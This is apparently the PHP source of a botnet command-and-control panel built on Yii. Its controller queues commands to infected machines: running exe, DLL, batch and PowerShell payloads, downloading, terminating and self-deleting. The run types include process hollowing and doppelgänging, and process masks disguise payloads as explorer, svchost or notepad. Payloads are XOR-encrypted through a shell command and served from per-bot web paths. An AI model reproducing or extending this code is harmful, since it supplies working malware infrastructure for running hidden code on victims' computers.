<?php

namespace frontend\controllers;

use Yii;
use common\models\Bots;
use frontend\models\BotsSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;
use yii\helpers\Json;
use common\models\Commands;
use common\models\Files;
use \yii\web\Response;
use yii\helpers\Html;
use yii\db\Expression;
use yii\helpers\FileHelper;
use yii\helpers\Url;
use common\models\Clones;
/**
 * BotsdataController implements the CRUD actions for Bots model.
 */
class BotcommandController extends Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['POST'],
                ],
            ],
        ];
    }

    /**
     * Lists all Bots models.
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $request = Yii::$app->request->queryParams;
        //print_r($request);die();
        
        if(!isset($request['bot'])){
            throw new \yii\web\NotFoundHttpException();
        }

        $botId = Bots::findByBotName($request['bot']);

        if(!$botId){
            throw new \yii\web\NotFoundHttpException();
        }else{

            if(Yii::$app->request->isGet){
                
                $model = Bots::findOne(['id'=>$botId]);
                //print_r($r);die();
                return $this->render('index', [
                    'model' => $model,
                ]);

            }elseif (Yii::$app->request->isPost) {
                $model = Bots::findOne(['id'=>$botId]);
                $relatedModel = New Commands();
                //$relatedModel = Commands::find(['bot_id' => $model['bot']])->all(); 
                $request = Yii::$app->request;
                if ($model->load($request->post())) {
                    if($this->commandValidate($model)){
                        $model->save(false);
                    }else{
                        die(); // return 404
                    }
                    // parse command
                    //$commandParsed = explode(':',$model->lastcommand);
                    $commandParsed[0] = $model->field0; // allways

                    $commandParsed[1] = $model->field1;
                    $commandParsed[2] = $model->field2;
                    $commandParsed[3] = $model->field3;
                    $commandParsed[4] = $model->field4;
                    $commandParsed[5] = $model->field5;
                    if($model->field6!=''){
                        $commandParsed[6] = '\r\n'.$model->field6; // divider before script
                    }
                    $commandParsed[7] = $model->field7;
                    
                    foreach ($commandParsed as $key => $value){ 
                        if ($value === ""){ 
                            unset($commandParsed[$key]);
                            $commandParsed[] = $value;
                        }
                    }

                    // rebuild array index
                    $commandParsed = array_values($commandParsed);

                    // 4-th param passed, but set as empty
                    // 7-th param script body replace \t on __
                    $usercommand = $model->field0.chr(9).$model->field1.chr(9).$model->field2.chr(9).$model->field3.chr(9).chr(9).$model->field5.chr(9).$model->field6.chr(9).str_replace(chr(9), '  ', $model->field7);
                   

                    // recode command
                    // (need for hide relal bot's commands from user)
                    $_commandtype = [
                        'nop'=>'0', 
                        'getinfo'=>'1',
                        'runexe'=>'10',
                        'rundll'=>'11',
                        'runbat'=>'12',
                        'runpws'=>'13',
                        'reset'=>'14',
                        'terminate'=>'15',
                        'download'=>'16',
                        'suicide'=>'100',
                        
                    ];


                    $_runtype = [
                        'create' => '1',
                        'hollowing' => '2',
                        'dopple' => '3',
                        'channel' => '1',
                        'dump' => '2',
                        
                    ];

                    
                    $_mask = [
                        'notuse' => '0',
                        'notepad' => '1',
                        'explorer' => '2',
                        'scvhost' => '3',
                        'cmd' => '4',
                    ];

                    // addition options and actions
                    $commandParsed[0] = $_commandtype[$commandParsed[0]];
                    switch ($commandParsed[0]) {
                        case '0':
                            //$commandParsed[1] = $commandParsed[1];
                            break;
                        case '1':
                            # code...
                            break;
                        case '10':
                            $commandParsed[1] = $_runtype[$commandParsed[1]];
                            //$commandParsed[2] = $commandParsed[2];
                            $commandParsed[3] = $_mask[$commandParsed[3]];
                            break;
                        case '11':
                            //$commandParsed[1] = $_runtype[$commandParsed[1]];
                            break;
                        case '12':
                            $commandParsed[1] = $_runtype[$commandParsed[1]];
                            //$commandParsed[4] = '\r\n'.$commandParsed[4]; // may changed?
                            break;
                        case '13':
                            $commandParsed[1] = $_runtype[$commandParsed[1]];
                            //$commandParsed[4] = '\r\n'.$commandParsed[4];
                            break;
                        case '14':
                            //$p = Commands::find()->andWhere(['bot_id' => Bots::findByBot($bot_id)['id']])->andWhere(['status' => 0])->orderBy('created_at')->one(); // find last command
                            Commands::updateAll(['status' => 2], ['and', ['bot_id' => $model->id], ['<=','status', 1]]);
                            break;
                        case '15':
                            # code...
                            break;
                        case '16':
                            # code...
                            break;
                        
                        default:
                            # code...
                            break;
                    }
                    
                    // end recoding


                    if($commandParsed[0]==10 || $commandParsed[0]==11){

                        if(!($commandParsed[2] == 'nofile' || $commandParsed[4] == 'nofile')){
                            // prepare file for download if not force update

                            // make replace link
                            $filedest = $model->bot.'/'.Yii::$app->security->generateRandomString(40);
                            
                            // get command link and replace
                            if($commandParsed[0]==10){
                                $c = 4; // 0-3 subcommand
                                if($commandParsed[1]=='4'){
                                    $c = 2; // 4 subcommand
                                }
                            }else{
                                $c = 2; // 11 command
                            }

                            // set  bot group to file
                            $f = Files::findOne(['storedfilename' => $commandParsed[$c]]);
                            $f->group = $model->group;
                            $f->save(false);

                            $filepath = Yii::getAlias('@absPath').$commandParsed[$c];
                            $sourcepath = $commandParsed[$c];

                            //$commandParsed[$c] = str_replace(Yii::$app->params['backend'],'',Url::base(true)).'/'.$filedest;

                            $commandParsed[$c] = Url::base(true).'/'.$filedest;

                            $commandParsed[$c] = '/'.$filedest; // test

                            // make bot path into web area
                            FileHelper::createDirectory(Yii::getAlias('@absPath').'/api/web/'.$model->bot);

                            // make shell for crypt and copy to web area
                            $shellcommand = 'cd '.Yii::getAlias('@absPath').'/utilities; ./xor '.$model->bot.' '.$filepath.' '.'../api/web/'.$filedest; // TODO new generator need

                            // fix clone
                            $clone = New Clones();
                            $clone->source = $sourcepath;
                            $clone->clone = '/'.$filedest;
                            $clone->clonetype = 0; // file for command 10
                            $clone->save(false);
                            
                            $e = shell_exec($shellcommand);
                        }else{
                            $commandParsed[2] = '';
                        }
                    }
                    $newcommand = '';
                    foreach ($commandParsed as $key => $value) {
                        $newcommand .= $value.' ';
                    }

                    $relatedModel->command = trim($newcommand);
                    $relatedModel->usercommand = trim($usercommand);
                    $relatedModel->created_at = new Expression('NOW()');
                    $relatedModel->admin = Yii::$app->user->id;
                    $relatedModel->commandtype = $commandParsed[0];
                    $relatedModel->bot_id = $model->id;
                    $relatedModel->ip = $model->ip;
                    $relatedModel->group = $model->group;
                    $relatedModel->save(false);

                    Yii::info('User '. Yii::$app->user->identity->username . ' takes command '.$relatedModel->command.' to bot ' . $model->bot, $category = 'userinfo');

                    return $this->redirect(Yii::$app->request->url);
                }
            }else{
                Yii::info('User '. Yii::$app->user->identity->username . ' wrote comment to bot ' . $model->bot, $category = 'userinfo');
            }
        }
    }

    public function commandValidate($model){
        // is busy
        $s = Bots::findByBot($model->bot);
        if($s->busy==1 && $model->field0!='reset' && $model->field0!='suicide'){
            return false;
        }

        // wrong command
        if(Bots::CommandsList($model->field0,0)===false){
            return false;
        }

        // wrong runtype
        if($model->field0=='runexe' || $model->field0=='update' || $model->field0=='runbat' || $model->field0=='runpws'){
            if(Bots::RuntypeList($model->field1,0)===false){
                return false;
            }else{
                return true;
            }
        }else{
            if($model->field1==''){
                return true;
            }else{
                return false;
            }
        }

        // wrong timeout
        if($model->field0=='nop' || $model->field0=='getinfo' || $model->field0=='runexe' || $model->field0=='rundll' || $model->field0=='runbat' || $model->field0=='runpws'){
            if(is_numeric($model->field2)){
                return true;
            }else{
                return false;
            }
        }else{
            if($model->field2==''){
                return true;
            }else{
                return false;
            }
        }

        // wrong mask
        if($model->field0=='runexe'){
            if(Bots::MaskList($model->field3,0)===false){
                return false;
            }else{
                return true;
            }
        }else{
            if($model->field3==''){
                return true;
            }else{
                return false;
            }
        } 

        // wrong file
        if($model->field0=='runexe' || $model->field0=='rundll' || $model->field0=='updateloader32' || $model->field0=='updateloader64' || $model->field0=='updatebot32' || $model->field0=='updatebot64' || $model->field0=='updatenow'){
            if(file_exists(Yii::getAlias('@absPath').$model->field4)===false){
                return false;
            }else{
                return true;
            }
        }else{
            if($model->field4==''){
                return true;
            }else{
                return false;
            }
        }

        // other controlled by bot


        //print_r(Bots::CommandsList($model->field0,0));die();
        return true;
    }


    /**
     * Finds the Bots model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return Bots the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = Bots::findOne($id)) !== null) {
            return $model;
        }

        throw new NotFoundHttpException('The requested page does not exist.');
    }

    /**
     * Displays a single Files model.
     * @param string $id
     * @return mixed
     */
    public function actionHoneypot()
    {   
        if (Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $request = Yii::$app->request->queryParams;

        if(!isset($request['bot'])){
            throw new \yii\web\NotFoundHttpException();
        }

        $botId = Bots::findByBotName($request['bot']);

        if(!$botId){
            throw new \yii\web\NotFoundHttpException();
        }else{

            $b = Bots::findOne(['id'=>$botId]);
            $b->type = 1;
            $b->save(false);
            $request = Yii::$app->request;
            if($request->isAjax){
                Yii::$app->response->format = Response::FORMAT_JSON;
                return ['forceClose'=>true,'forceReload'=>'#crud-datatable-pjax'];    
            }else{
                return redirect(['index']);
            }
        }
    }

    /**
     * Displays a single Files model.
     * @param string $id
     * @return mixed
     */
    public function actionTestbot()
    {   
        if (Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $request = Yii::$app->request->queryParams;

        if(!isset($request['bot'])){
            throw new \yii\web\NotFoundHttpException();
        }

        $botId = Bots::findByBotName($request['bot']);

        if(!$botId){
            throw new \yii\web\NotFoundHttpException();
        }else{

            $b = Bots::findOne(['id'=>$botId]);
            $b->type = 2;
            $b->save(false);
            $request = Yii::$app->request;
            if($request->isAjax){
                Yii::$app->response->format = Response::FORMAT_JSON;
                return ['forceClose'=>true,'forceReload'=>'#crud-datatable-pjax'];    
            }else{
                return redirect(['index']);
            }
        }
    }

    public function actionJustbot()
    {   
        if (Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $request = Yii::$app->request->queryParams;

        if(!isset($request['bot'])){
            throw new \yii\web\NotFoundHttpException();
        }

        $botId = Bots::findByBotName($request['bot']);

        if(!$botId){
            throw new \yii\web\NotFoundHttpException();
        }else{

            $b = Bots::findOne(['id'=>$botId]);
            $b->type = 0;
            $b->save(false);
            $request = Yii::$app->request;
            if($request->isAjax){
                Yii::$app->response->format = Response::FORMAT_JSON;
                return ['forceClose'=>true,'forceReload'=>'#crud-datatable-pjax'];    
            }else{
                return redirect(['index']);
            }
        }
    }
}
